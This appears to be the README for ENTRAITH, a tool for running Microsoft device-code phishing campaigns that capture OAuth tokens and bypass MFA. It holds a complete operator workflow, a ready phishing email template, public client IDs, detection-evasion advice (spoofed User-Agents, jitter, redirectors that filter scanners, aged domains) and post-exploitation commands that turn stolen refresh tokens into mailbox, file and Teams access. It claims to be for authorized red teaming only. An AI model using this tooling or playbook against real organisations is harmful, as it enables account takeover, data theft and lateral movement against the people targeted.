# ENTRAITH

Device Code Phishing Operator Console — a self-hosted platform for conducting Microsoft OAuth2 Device Authorization Grant attacks during authorized red team assessments.

---

## Table of Contents

1. [How the attack works](#how-the-attack-works)
2. [Architecture](#architecture)
3. [Code structure](#code-structure)
4. [Setup and configuration](#setup-and-configuration)
5. [Operator workflow](#operator-workflow)
6. [Mail system](#mail-system)
7. [OPSEC](#opsec)
8. [Persistence and database](#persistence-and-database)
9. [API reference](#api-reference)
10. [Artifacts and evidence](#artifacts-and-evidence)
11. [Post-exploitation](#post-exploitation)
12. [Docker deployment](#docker-deployment)

---

## How the attack works

The Microsoft Device Authorization Grant (RFC 8628) is an OAuth2 flow designed for input-constrained devices (TVs, printers, CLI tools) that cannot open a browser. ENTRAITH abuses this flow against human targets.

### Normal legitimate flow

```
Device (CLI/TV)  →  POST /devicecode  →  Microsoft
                 ←  {device_code, user_code, verification_uri}

Device shows:  "Visit microsoft.com/devicelogin and enter: ABCD-EFGH"

User opens browser, visits verification_uri, enters user_code, authenticates with MFA

Device polls:  POST /token?device_code=...
Microsoft:  ←  {access_token, refresh_token, id_token}
```

### What ENTRAITH does instead

The operator becomes the "device." Microsoft issues a `device_code` per request with no requirement that a real device initiated it — only a valid `client_id` and `scope` are needed. ENTRAITH requests one `device_code` per target, extracts the `user_code`, and delivers it to that specific target via a phishing email. Each target gets a unique code tied to their session. When a target authenticates, the token is captured and correlated back to them.

```
ENTRAITH  →  POST /devicecode (client_id, scope)  →  Microsoft
          ←  {device_code, user_code="ABCD-EFGH", verification_uri}

ENTRAITH  →  Phishing email to target@corp.com:
               "Visit microsoft.com/devicelogin and enter: ABCD-EFGH"

Target opens email, visits URL, enters their unique code, completes MFA

ENTRAITH polls:  POST /token?device_code=...  (every N seconds with jitter)
Microsoft:    ←  {access_token, refresh_token, id_token}

ENTRAITH  →  GET /me  →  Microsoft Graph
          ←  {userPrincipalName: "target@corp.com"}

Token saved to SQLite, UPN correlated, operator notified in real time.
```

### Why it bypasses MFA

The target completes MFA themselves — against the legitimate Microsoft login page. ENTRAITH never touches the credentials or MFA. The resulting tokens carry the same trust level as if a real device had initiated the flow. The access token grants API access; the refresh token can be exchanged for new access tokens long after the session ends.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│  cmd/entraith/main.go                                                │
│  ┌──────────────┐  ┌──────────────────┐  ┌────────────────────────┐ │
│  │ campaigns.   │  │  mailer.Manager  │  │  api.Handler           │ │
│  │ Manager      │  │  (profiles,      │  │  (HTTP routes,         │ │
│  │ (campaigns,  │  │   templates)     │  │   wires the managers)  │ │
│  │  polling)    │  │                  │  │                        │ │
│  └──────┬───────┘  └────────┬─────────┘  └────────────────────────┘ │
│         │                   │                                        │
│         └──────────┬────────┘                                        │
│                    ▼                                                  │
│           ┌────────────────┐                                         │
│           │  store.Store   │  ← SQLite (entraith.db)                 │
│           │  campaigns     │    WAL mode, FK cascade                 │
│           │  targets       │                                         │
│           │  device_codes  │                                         │
│           │  tokens        │                                         │
│           │  email_results │                                         │
│           │  profiles      │                                         │
│           │  templates     │                                         │
│           └────────────────┘                                         │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │  devicecode.Engine  (per campaign, in-memory only)           │   │
│  │  - one goroutine per target for polling                      │   │
│  │  - jittered sleep intervals                                  │   │
│  │  - spoofed User-Agent                                        │   │
│  │  - Results chan → collectResults goroutine                   │   │
│  └──────────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────────┘
           │                          │
           ▼                          ▼
  login.microsoftonline.com    graph.microsoft.com
  (device codes + polling)     (/me UPN resolution)
```

### Data flow on launch

```
Manager.Launch(campaignID)
  │
  ├─ for each target (sequential, jittered delay 800ms–3s):
  │    Engine.RequestDeviceCode(targetID, email)
  │      └─ POST /devicecode → Microsoft
  │         store session{device_code, user_code, state=pending}
  │         db.UpsertDeviceCode() → SQLite device_codes table
  │
  ├─ for each code:
  │    Engine.StartPolling(ctx, targetID)
  │      └─ goroutine: loop {
  │             sleep(interval ± 30% jitter)
  │             POST /token?device_code=...
  │             if completed → resolveUPN() → Results <- token
  │             if expired/error → mark session, return
  │           }
  │
  └─ go collectResults(ctx, campaign)
       └─ for result := range Engine.Results:
            c.Results = append(...)
            db.InsertToken() → SQLite tokens table
            db.UpsertCampaign() → update status/counts
            log "[+] TOKEN CAPTURED"
```

### Data flow on send-emails

```
Manager.SendEmails(campaignID, profile, template)
  │
  ├─ Engine.AllSessions() → map[targetID]SessionSnapshot
  │    (snapshot includes user_code + verification_uri)
  │
  └─ for each session:
       TemplateData{UserCode, RealURL, TargetEmail, TargetName}
       mailer.Render(subject, template, data)
         └─ string replacer: {{DCODE}} {{URL}} {{REALURL}} {{EMAIL}} {{NAME}}
       mailer.Send(profile, template, data)
         └─ buildMIME() → RFC 5322 message with:
              - random Message-ID (crypto/rand)
              - random MIME boundary (crypto/rand)
              - RFC 5322 Date header
              - no X-Mailer
            sendImplicitTLS() or smtp.SendMail()
       db.InsertEmailResult() → SQLite email_results table
```

---

## Code structure

```
entraith/
├── cmd/
│   └── entraith/
│       └── main.go              # CLI entry point: server / validate / version
│                                # Opens SQLite DB, wires store into managers
│
├── internal/
│   ├── config/
│   │   └── config.go            # key=value config parser, struct + defaults
│   │
│   ├── store/
│   │   └── store.go             # SQLite persistence layer
│   │                            # Schema migration, CRUD for all entities
│   │                            # CampaignExport for evidence packaging
│   │
│   ├── campaigns/
│   │   └── campaigns.go         # Campaign lifecycle, Manager, Launch, SendEmails
│   │                            # Load() from DB at startup
│   │                            # DeleteCampaign(), ExportCampaign()
│   │
│   ├── modules/
│   │   └── devicecode/
│   │       └── devicecode.go    # Engine, session state, polling goroutines, UPN
│   │
│   ├── targets/
│   │   └── targets.go           # In-memory target store, CSV import
│   │
│   ├── mailer/
│   │   └── mailer.go            # SenderProfile, EmailTemplate, Render, Send, MIME
│   │                            # Callback-based persistence (injected from main.go)
│   │
│   ├── api/
│   │   └── handler.go           # All HTTP handlers and route registration
│   │                            # Including export and delete endpoints
│   │
│   └── web/
│       ├── dashboard.go         # go:embed wrapper
│       └── dashboard.html       # Single-page operator console (JS + CSS)
│
├── bootstrap/
│   ├── engagement.example.conf  # Example key=value config
│   ├── engagement.example.yaml  # Example YAML config (for reference)
│   └── targets.example.csv      # Example target list
│
└── deploy/
    ├── Dockerfile               # Multi-stage build: golang → alpine
    └── docker-compose.yml       # Server + optional Caddy TLS reverse proxy
```

### Package responsibilities

**`config`** — loads a flat `key=value` config file (comments with `#`, inline comments stripped). Sets safe defaults for missing values. No external dependencies.

**`store`** — the SQLite persistence layer (`modernc.org/sqlite`, pure Go, no CGO). Opened once at startup and shared by both managers. Schema is applied via `CREATE TABLE IF NOT EXISTS` on every startup (idempotent migration). Foreign keys with `ON DELETE CASCADE` mean deleting a campaign row automatically deletes all its targets, device codes, tokens, and email results. Provides `ExportCampaign(id)` which assembles a complete `CampaignExport` struct containing all evidence for one campaign.

**`campaigns`** — owns the `Manager` (map of campaigns, mutex-protected). Each `Campaign` holds a `*targets.Store`, a `*devicecode.Engine`, result slices, and email send results. `Manager.Load()` reads all campaigns from SQLite at startup and reconstructs in-memory state. `Manager.Launch` orchestrates the multi-phase device code flow and persists each device code and token to the database as they are captured. `Manager.DeleteCampaign` stops any active polling, cascades the SQLite deletion, and removes the campaign from memory. `Manager.ExportCampaign` delegates to `store.ExportCampaign`.

**`devicecode`** — the core engine. One `Engine` per campaign (in-memory only; not persisted directly). Holds a `map[targetID]*Session`. Each session tracks a device code response and its current state (`pending`, `completed`, `expired`, `error`, `cancelled`). `StartPolling` spawns one goroutine per target. Results are delivered via a buffered channel (`chan *TokenResult`). All outbound HTTP requests use a consistent, spoofed User-Agent chosen at engine creation.

**`targets`** — thread-safe in-memory store. Deduplicates by lowercase email. Supports CSV import with flexible column detection (only `email` is required). IDs are 8-byte random hex strings. The `ImportCSV` result is immediately persisted to the DB by the API handler via `Manager.SaveTargetToDB`.

**`mailer`** — stateless send logic plus an in-memory manager for profiles and templates. `NewManager()` takes no arguments; persistence is injected by `main.go` via `SetPersistence(...)` callbacks — keeping the package free of any import cycle with `store`. `Render` performs simple string replacement (no Go templates, so no escaping conflicts with HTML). `buildMIME` constructs a proper RFC 5322 message with per-message random `Message-ID` and MIME boundary from `crypto/rand`.

**`api`** — `Handler` holds pointers to both managers. `Routes()` returns a configured `*http.ServeMux` with all endpoints. Includes `GET /api/campaigns/{id}/export` (downloads full JSON evidence package) and `DELETE /api/campaigns/{id}` (wipes campaign and all data).

**`web`** — single embedded HTML file. The dashboard is a self-contained SPA with no external JS dependencies. It communicates exclusively via the REST API and an SSE stream for live updates.

### How the inner/outer mux works

```go
// main.go — outer mux
mux.HandleFunc("/", dashboardHandler)          // catch-all → SPA
mux.Handle("/api/", apiHandler.Routes())       // prefix → inner mux
mux.HandleFunc("GET /health", healthHandler)   // exact

// api/handler.go — inner mux (returned by Routes())
mux.HandleFunc("POST /api/campaigns", ...)
mux.HandleFunc("GET /api/campaigns/{id}/events", ...)
// etc.
```

The outer `/api/` pattern strips no prefix — the inner mux receives the full path (e.g., `/api/campaigns`) and matches it against its own method+path patterns. Go 1.22's routing requires that the outer `"/"` be method-agnostic (no `GET /`) to avoid a specificity conflict with the method-free `"/api/"` pattern.

### Campaign state machine

```
Draft ──[Launch]──► Running ──[Stop]──► Aborted
                      │
                      └──[all tokens received or codes expired]──► Completed

[restart] Running → Aborted  (polling goroutines cannot survive restart)
```

The state is stored as an integer (`CampaignStatus`) in SQLite and serialised as its string form in JSON via `Status.String()`. When a running campaign is loaded from the database at startup, it is automatically marked `aborted` because its polling goroutines are gone.

### Session state machine (per target)

```
Initializing ──[RequestDeviceCode]──► Pending
                                        │
                   ┌────────────────────┤
                   ▼                    ▼
               Completed            Expired
               (token captured)     (15 min elapsed)
                                        │
                                    Error / Cancelled
```

Session state lives in-memory only (`devicecode.Engine`). The device code itself is persisted in the `device_codes` table so it appears in campaign exports.

---

## Setup and configuration

### Requirements

- Go 1.22+
- Outbound HTTPS to `login.microsoftonline.com` and `graph.microsoft.com`
- An SMTP account for sending phishing emails

### Build

```bash
go build -o entraith ./cmd/entraith
```

The binary embeds the dashboard HTML at compile time via `go:embed`. The only runtime file dependencies are the config file and the SQLite database (created automatically on first run).

### Config file format

The config uses a simple `key=value` format:

```ini
# Engagement metadata
engagement.id         = CORP-2026-RTO-001
engagement.operator   = operator
engagement.client_code = CORPX

# Server
server.host = 127.0.0.1
server.port = 8443

# Azure AD / Entra ID
campaign.tenant_id    = common
campaign.client_id    = d3590ed6-52b3-4102-aeff-aad2292ab01c
campaign.scope        = https://graph.microsoft.com/.default offline_access openid profile
campaign.poll_interval = 5

# Storage (created automatically if missing)
storage.artifacts_path = /opt/entraith/data/artifacts
storage.exports_path   = /opt/entraith/data/exports
```

Lines beginning with `#` are comments. Inline comments (`value # comment`) are stripped. Missing optional fields use safe defaults (port `8443`, host `127.0.0.1`, poll interval `5`s).

The SQLite database is created at `<parent of artifacts_path>/entraith.db`. Given the example above, that would be `/opt/entraith/data/entraith.db`.

### Known public client IDs

These are well-known Microsoft first-party app IDs. No Azure app registration is required — they already exist in every tenant.

| Application | Client ID |
|-------------|-----------|
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` |
| Azure PowerShell | `1950a258-227b-4e31-a9cf-717495945fc2` |

Using `common` as `tenant_id` accepts authentication from any Azure AD tenant. Use a specific tenant UUID to restrict to a single organisation.

### Starting the server

```bash
./entraith server --config engagement.conf
```

```bash
./entraith validate --config engagement.conf   # check config without starting
./entraith version
```

---

## Operator workflow

### Step 1 — Create a campaign

In the sidebar, enter a campaign name (e.g., `q1-finance-dc`) and optional description, then click **Create Campaign**. This instantiates a `Campaign` row in the database with status `draft` and loads it into memory.

### Step 2 — Import targets

**Via CSV upload** — drag a file onto the upload area or click to browse. Required column: `email`. Optional columns: `display_name`, `department`, `region`, `group`, `custom_field`. Duplicate emails are silently skipped. All imported targets are immediately persisted to the `targets` table in the database.

Example CSV:
```csv
email,display_name,department,region,group
jsmith@corp.com,John Smith,Finance,US-East,executives
mary.jones@corp.com,Mary Jones,Finance,US-East,finance
```

**Via paste** — paste one email per line into the text area and click **Import Pasted**. These are converted to a minimal CSV (`email` column only) before import, so `display_name` / `{{NAME}}` will be empty.

### Step 3 — Configure mail

Click **⚙ Configure Mail** in the sidebar. This opens the mail configuration view with two tabs.

**Sender Profiles tab** — create one or more SMTP accounts (your phishing Office365/Gmail accounts). Profiles are persisted to the `sender_profiles` table and survive server restarts.

**Email Templates tab** — write or upload your phishing HTML email. Use template placeholders. Click **Preview** to render with sample data before saving. Templates are persisted to the `email_templates` table.

### Step 4 — Launch the campaign

Click **▶ Launch Campaign**. This triggers `Manager.Launch()`:

1. For each target, `Engine.RequestDeviceCode()` issues a `POST` to `login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode`. Microsoft returns a `device_code`, `user_code`, `verification_uri`, and expiry.
2. A random delay of 800ms–3s is inserted between each request.
3. Each device code is written to the `device_codes` table in the database and to `artifacts/{campaign_id}/device_codes.json`.
4. For each target, `Engine.StartPolling()` spawns a goroutine that polls `POST /token` at the configured interval (±30% jitter) until the code is redeemed, expires, or the campaign is stopped.
5. A `collectResults` goroutine listens on the engine's `Results` channel and writes each captured token to the `tokens` table immediately.

### Step 5 — Send phishing emails

Select a **Sender Profile** and **Email Template** from the Phishing Mail section of the sidebar, then click **✉ Send Phishing Emails**.

This calls `Manager.SendEmails()`, which iterates all active sessions, renders the template for each target (substituting their specific `user_code` and `verification_uri`), and dispatches the email via SMTP. Results (success/failure per target) are written to the `email_results` table and visible in the **Emails Sent** tab.

Email sending is intentionally decoupled from launch — you can launch first (start the polling clock) and send emails immediately after, or adjust timing as needed.

### Step 6 — Monitor

The **Sessions** tab updates in real time via a Server-Sent Events stream (`/api/campaigns/{id}/events`). The server pushes a JSON snapshot every 2 seconds containing all session states. The dashboard updates stats and the session table without a page reload.

When a token is captured, it appears in **Captured Tokens** and a notification flashes in the top-right corner. Token data persists across server restarts — captured tokens are loaded from the database on startup.

### Step 7 — Export evidence

Click **↓ Export Campaign** in the Campaign Actions sidebar. The browser downloads `campaign_<id>_export.json`, a complete evidence package containing:

- Campaign metadata (name, status, timestamps)
- All targets
- All device codes issued
- All captured tokens (access, refresh, ID token, UPN, timestamps)
- All email send results

This file is the primary deliverable for evidence documentation.

### Step 8 — Delete when done

Click **🗑 Delete Campaign**. After a confirmation dialog, the campaign and **all associated data** (targets, device codes, tokens, email results) are permanently deleted from the database via SQLite `ON DELETE CASCADE`. The in-memory state is cleared and the UI resets. Export before deleting.

---

## Mail system

### Sender profiles

A profile maps to one SMTP account. Fields:

| Field | Notes |
|-------|-------|
| `name` | Internal label |
| `host` | SMTP hostname |
| `port` | `587` (STARTTLS, default) or `465` (implicit TLS) |
| `username` | SMTP auth username |
| `password` | SMTP auth password — stored in the SQLite database at rest |
| `from_name` | Display name in the `From:` header |
| `from_address` | Sender email address; also used as the domain in `Message-ID` |
| `implicit_tls` | `true` → TLS-on-connect (port 465); `false` → STARTTLS negotiated automatically |

**Office365:**
```
host: smtp.office365.com  port: 587  implicit_tls: false
```
**Gmail (app password):**
```
host: smtp.gmail.com  port: 587 or 465
```

After saving, use **Test Send** to verify the SMTP connection and delivery before a live campaign.

### Email templates

Templates are HTML documents with optional plain-text fallback. The HTML is rendered in the target's email client; the plain-text part is shown in clients that disable HTML.

#### Template placeholders

| Placeholder | Resolved to |
|-------------|-------------|
| `{{DCODE}}` | Target's unique user code — e.g. `ABCD-EFGH` |
| `{{URL}}` | Redirector URL if configured, otherwise the real Microsoft verification URI |
| `{{REALURL}}` | Always `https://microsoft.com/devicelogin` (the real URI, regardless of redirector) |
| `{{EMAIL}}` | Target's email address |
| `{{NAME}}` | Target's display name from the CSV (empty if not imported) |

#### Redirector URL

Set **Redirector URL** on the template to route the link targets click through a redirector or C2 domain before Microsoft. When set:

- `{{URL}}` in the email resolves to your redirector (e.g., `https://r.yourdomain.com/go`)
- `{{REALURL}}` still resolves to the real Microsoft URL

This means the link in the email points to your infrastructure, not `microsoft.com` directly, which helps with reputation scanning and allows you to gate clicks (by IP, user agent, geography, etc.) at the redirector before forwarding to Microsoft.

**Example template:**
```html
<p>Hello {{NAME}},</p>
<p>
  IT Security requires you to re-verify your device due to a recent policy update.
  Please click below and enter your code when prompted.
</p>
<p style="text-align:center;margin:32px 0">
  <a href="{{URL}}" style="background:#0078d4;color:#fff;padding:14px 32px;
     text-decoration:none;border-radius:4px;font-size:16px">
    Verify My Device
  </a>
</p>
<p style="text-align:center;font-size:28px;font-weight:bold;letter-spacing:6px;
   color:#0078d4">{{DCODE}}</p>
<p style="color:#888;font-size:12px;text-align:center">
  This code expires in 15 minutes.<br>
  If you did not request this, contact the helpdesk immediately.
</p>
```

You can upload a pre-built HTML file with the **↑ Upload HTML** button — it loads the file contents into the editor without saving, so you can review and adjust before committing.

### How MIME messages are built

Each email is constructed as a proper RFC 5322 message:

```
Date: Mon, 11 Mar 2026 14:23:05 -0500          ← real send time, RFC 5322 format
Message-ID: <3f8a1b2c...@yourdomain.com>        ← cryptographically random local part
From: IT Security Team <security@yourdomain.com>
To: target@corp.com
Subject: Action Required: Verify your device
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="----=_Part_a4f2..."  ← random boundary

------=_Part_a4f2...
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

[plain text fallback]

------=_Part_a4f2...
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit

[HTML body]
------=_Part_a4f2...--
```

No `X-Mailer`, `X-PHP-Originating-Script`, or other tool-identifying headers are added.

---

## OPSEC

### User-Agent spoofing

All outbound HTTP requests to Microsoft endpoints (`/devicecode`, `/token`, Graph `/me`) use a realistic Windows browser User-Agent rather than Go's default `Go-http-client/1.x`. The pool includes recent Edge, Chrome, and Firefox strings. One UA is chosen at `Engine` creation and used consistently for all requests in that campaign — making all traffic for one campaign appear to come from the same browser session.

```go
// internal/modules/devicecode/devicecode.go
var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ... Edg/120.0.2210.133",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/120.0.0.0 Safari/537.36",
    // ...
}
// Each Engine picks one at construction: e.userAgent = pickUA()
// All requests: req.Header.Set("User-Agent", e.userAgent)
```

### Polling jitter

Each polling goroutine sleeps for `interval ± 30%` before each poll attempt, computed independently. This prevents all goroutines from waking simultaneously and sending a burst of identical requests at fixed cadence — a distinctive pattern that would stand out in Microsoft's auth logs.

```go
// jitterDuration returns d ± up to 30% random jitter
func jitterDuration(d time.Duration) time.Duration {
    jitter := time.Duration(rand.Int63n(int64(d * 30 / 100)))
    if rand.Intn(2) == 0 { return d + jitter }
    return d - jitter
}
// Used in StartPolling: time.After(jitterDuration(e.interval))
```

`slow_down` responses from Microsoft trigger additional jittered backoff (base 10s ± 30%).

### Device code request spacing

When launching a campaign, ENTRAITH issues device code requests sequentially with a random **800ms–3000ms** delay between each request instead of a tight loop. This smooths the burst of requests and avoids triggering Microsoft's rate limiting or anomaly detection.

### Email header hygiene

- **`Message-ID`** — generated with 16 bytes from `crypto/rand`, scoped to the sender's domain. Unique per message, no tool fingerprint.
- **`Date`** — RFC 5322 format from actual send time.
- **MIME boundary** — 12 bytes from `crypto/rand` per message. A static boundary string is a trivial fingerprint.
- **No `X-Mailer`** — never added.
- **No `X-Originating-IP`** — never added.

### Redirector URL

Set a redirector URL on the email template so the link targets click does not go directly to `microsoft.com`. Your redirector can:

- Filter by IP, user agent, or geo (block sandboxes and email scanners)
- Gate traffic to the real Microsoft URL only after initial qualifying checks
- Log click events independently of Microsoft

Use `{{REALURL}}` in a hidden element or tracking pixel if you need the real URL in the message without exposing it in the visible link.

### Deployment OPSEC (operator responsibility)

These are not handled by ENTRAITH but are critical:

| Control | Recommendation |
|---------|----------------|
| **Infrastructure** | Dedicated VPS per engagement, not shared or reused |
| **SMTP account** | Purpose-registered domain with proper SPF, DKIM, DMARC aligned to `from_address` |
| **Domain age** | Register the phishing domain weeks before the engagement; freshly registered domains are flagged |
| **TLS** | Run behind Caddy or nginx with a real certificate; `microsoft.com/devicelogin` is HTTPS and email clients inspect sender infrastructure |
| **Egress** | Route operator traffic through a VPN or SSH tunnel; the machine running ENTRAITH makes direct requests to Microsoft |
| **Access** | Bind to `127.0.0.1` (default) and access via SSH tunnel; never expose the dashboard to the internet |
| **Cleanup** | Export campaign data, then use the Delete button to wipe the database before leaving infrastructure |

---

## Persistence and database

All operator data is stored in a single SQLite database file at `<parent of artifacts_path>/entraith.db`. The database uses WAL mode for concurrent read access and enforces foreign keys.

### Schema

```
campaigns        — campaign metadata (id, name, status, timestamps, paths)
targets          — import list per campaign (FK → campaigns ON DELETE CASCADE)
device_codes     — issued device codes per campaign (FK → campaigns ON DELETE CASCADE)
tokens           — captured OAuth tokens per campaign (FK → campaigns ON DELETE CASCADE)
email_results    — per-target email send outcomes (FK → campaigns ON DELETE CASCADE)
sender_profiles  — SMTP accounts (global, not per-campaign)
email_templates  — phishing HTML templates (global, not per-campaign)
```

### Startup behaviour

On every server start, `store.New()` runs `CREATE TABLE IF NOT EXISTS` for all tables (idempotent). Then:

1. Sender profiles and email templates are loaded from the DB into `mailer.Manager`.
2. All campaigns are loaded from the DB into `campaigns.Manager`, including their targets, tokens, and email results.
3. Any campaign that was `running` at shutdown is marked `aborted` — its polling goroutines cannot survive a restart and must be re-launched manually.

### Cascaded deletion

When **Delete Campaign** is clicked:
1. `Manager.DeleteCampaign` cancels any active polling goroutines.
2. `DELETE FROM campaigns WHERE id=?` is issued.
3. SQLite cascades the delete to `targets`, `device_codes`, `tokens`, and `email_results` automatically.
4. The campaign is removed from in-memory state.

Sender profiles and email templates are **not** deleted — they are global and reused across engagements.

### Export format

`GET /api/campaigns/{id}/export` returns a JSON file downloaded by the browser:

```json
{
  "campaign": { "id": "...", "name": "...", "status": 4, ... },
  "targets": [ { "id": "...", "email": "...", ... } ],
  "device_codes": [ { "device_code": "...", "user_code": "ABCD-EFGH", ... } ],
  "tokens": [
    {
      "campaign_id": "...",
      "target_id": "...",
      "target_email": "jsmith@corp.com",
      "access_token": "eyJ...",
      "refresh_token": "0.AX...",
      "id_token": "eyJ...",
      "upn": "jsmith@corp.com",
      "redeemed_at": "2026-03-11T14:03:47Z"
    }
  ],
  "email_results": [ { "target_email": "...", "success": true, "sent_at": "..." } ],
  "exported_at": "2026-03-11T15:00:00Z"
}
```

---

## API reference

All endpoints are under `/api/`. Content-Type for request bodies is `application/json` unless noted.

### Campaigns

| Method | Path | Body / Notes |
|--------|------|--------------|
| `GET` | `/api/campaigns` | Returns array of campaign objects |
| `POST` | `/api/campaigns` | `{name, description}` → 201 with campaign |
| `GET` | `/api/campaigns/{id}` | Campaign object |
| `GET` | `/api/campaigns/{id}/status` | Live counts: targets, tokens, sessions |
| `POST` | `/api/campaigns/{id}/launch` | Starts device code flow + polling |
| `POST` | `/api/campaigns/{id}/stop` | Cancels all polling goroutines |
| `GET` | `/api/campaigns/{id}/tokens` | Array of captured `TokenResult` objects |
| `GET` | `/api/campaigns/{id}/sessions` | Map of session snapshots |
| `GET` | `/api/campaigns/{id}/events` | SSE stream — emits status JSON every 2s |
| `POST` | `/api/campaigns/{id}/send-emails` | `{profile_id, template_id}` |
| `GET` | `/api/campaigns/{id}/email-results` | Array of `EmailSendResult` per target |
| `GET` | `/api/campaigns/{id}/export` | Downloads `campaign_<id>_export.json` |
| `DELETE` | `/api/campaigns/{id}` | Deletes campaign + all data (cascades) |

### Targets

| Method | Path | Notes |
|--------|------|-------|
| `POST` | `/api/campaigns/{id}/targets/import` | `multipart/form-data` with `file` field, or `text/plain` CSV body |
| `GET` | `/api/campaigns/{id}/targets` | Array of `Target` objects |

### Sender profiles

| Method | Path | Body |
|--------|------|------|
| `GET` | `/api/mailer/profiles` | Array of profiles |
| `POST` | `/api/mailer/profiles` | `{name, host, port, username, password, from_name, from_address, implicit_tls}` |
| `DELETE` | `/api/mailer/profiles/{id}` | — |
| `POST` | `/api/mailer/profiles/{id}/test` | `{to}` — sends a plain-text test email |

### Email templates

| Method | Path | Body |
|--------|------|------|
| `GET` | `/api/mailer/templates` | Array of templates |
| `POST` | `/api/mailer/templates` | `{name, subject, html_body, text_body?, redirector_url?}` |
| `PUT` | `/api/mailer/templates/{id}` | Same fields as POST — full replace |
| `DELETE` | `/api/mailer/templates/{id}` | — |

### Session snapshot object

```json
{
  "target_id": "a1b2c3d4e5f6g7h8",
  "target_email": "jsmith@corp.com",
  "user_code": "ABCD-EFGH",
  "verification_uri": "https://microsoft.com/devicelogin",
  "state": 1,
  "state_str": "pending",
  "issued_at": "2026-03-11T14:00:00Z",
  "expires_at": "2026-03-11T14:15:00Z",
  "last_polled": "2026-03-11T14:00:10Z",
  "poll_count": 2,
  "upn": ""
}
```

### Token result object

```json
{
  "access_token": "eyJ0eXAiOiJKV1Qi...",
  "refresh_token": "0.AXXXXXXXXXXX...",
  "id_token": "eyJ0eXAiOiJKV1Qi...",
  "token_type": "Bearer",
  "expires_in": 3599,
  "scope": "https://graph.microsoft.com/.default openid profile offline_access",
  "target_id": "a1b2c3d4e5f6g7h8",
  "target_email": "jsmith@corp.com",
  "redeemed_at": "2026-03-11T14:03:47Z",
  "upn": "jsmith@corp.com"
}
```

---

## Artifacts and evidence

Beyond the SQLite database, artifact files are written to `storage.artifacts_path/<campaign_id>/` with file mode `0600`. Directories are created at `0700`.

| File | Written when | Contents |
|------|-------------|----------|
| `device_codes.json` | Campaign launch | Array of all `DeviceCodeResponse` objects — `device_code`, `user_code`, `verification_uri`, `expires_at`, per target |
| `token_<targetID>_<nanoseconds>.json` | Each token capture | Single `TokenResult` — all tokens, UPN, timestamps |

The nanosecond timestamp in token filenames ensures no collision if the same target somehow captures multiple tokens.

The primary evidence package is the JSON export from `GET /api/campaigns/{id}/export`, which includes all data from the database in a single structured file.

---

## Post-exploitation

Captured refresh tokens persist beyond the initial session and can be used to acquire new access tokens for any resource the original scope covered.

### TokenTacticsV2

```powershell
# Refresh into Microsoft Graph
Invoke-RefreshToMSGraphToken -RefreshToken "<refresh_token>" -Domain "corp.com"

# Refresh into Exchange Online (email)
Invoke-RefreshToEXOToken -RefreshToken "<refresh_token>" -Domain "corp.com"

# Refresh into Azure Core Management
Invoke-RefreshToAzureCoreManagementToken -RefreshToken "<refresh_token>" -Domain "corp.com"

# Refresh into Teams
Invoke-RefreshToMSTeamsToken -RefreshToken "<refresh_token>" -Domain "corp.com"
```

### What the tokens grant (with Graph scope)

- Read/send email via Microsoft Graph
- Access files in OneDrive and SharePoint
- Read Teams messages and channels
- Enumerate Azure AD users, groups, roles
- Access calendar, contacts
- Further lateral movement via Azure RBAC (if target has Azure permissions)

The `offline_access` scope in the default configuration ensures a refresh token is issued, enabling persistent access after the initial capture.

---

## Legal

For authorized security assessments only. You must have explicit written permission from the target organisation before running this tool against their users or infrastructure. Unauthorized use is illegal and unethical.
